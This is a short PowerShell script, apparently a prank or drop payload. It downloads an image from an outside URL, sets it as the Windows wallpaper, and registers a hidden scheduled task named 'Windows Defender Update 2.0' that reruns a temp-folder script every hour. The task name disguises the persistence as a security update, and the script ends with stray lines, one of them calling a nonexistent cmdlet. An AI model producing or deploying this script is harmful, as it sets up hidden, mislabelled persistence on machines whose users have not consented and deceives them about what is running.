function changeWallpaper {
# CHANGE THIS LINK TO CHANGE IMAGE
$URL = "https://cdn1.zzcartoon.com/contents/videos_screenshots/1000/1318/preview.mp4.jpg";

# variables
$temp_path = $env:temp;
$current_date = (Get-Date -Format "ddmmyyyy-HH-mm-ss").ToString()
$image_path = "$temp_path/$current_date.jpg";
$script_path = "$temp_path/w.ps1" 

# Download picture
$response = Invoke-WebRequest $URL -o $image_path -UseBasicParsing;

# Set picture as wallpaper
$code = @' 
using System.Runtime.InteropServices; 
namespace Win32{ 
     public class Wallpaper{ 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction,int uParam,string lpvParam,int fuWinIni);     
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
         }
    }
 } 
'@
add-type $code 
[Win32.Wallpaper]::SetWallpaper($image_path)
}

changeWallpaper;

# Checks if task is already created, if not it will create a task which executes this script every 60 minutes 
$task_name = "Windows Defender Update 2.0";
if(-not (Get-ScheduledTask | Where-Object {$_.TaskName -like $task_name })) {
   $PS = New-ScheduledTaskAction -Execute "Powershell" -Argument "-WindowStyle Hidden -file $script_path";
   $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 60);
   $settings = New-ScheduledTaskSettingsSet -Hidden;
   Register-ScheduledTask -TaskName $task_name -Trigger $trigger -Action $PS -Settings $settings;
} else {
  # For debugging
  Write-Output "task already created";
}


powershell make-file "$env:TEMP/test.txt"

powershell New-Item "$env:TEMP/test.txt";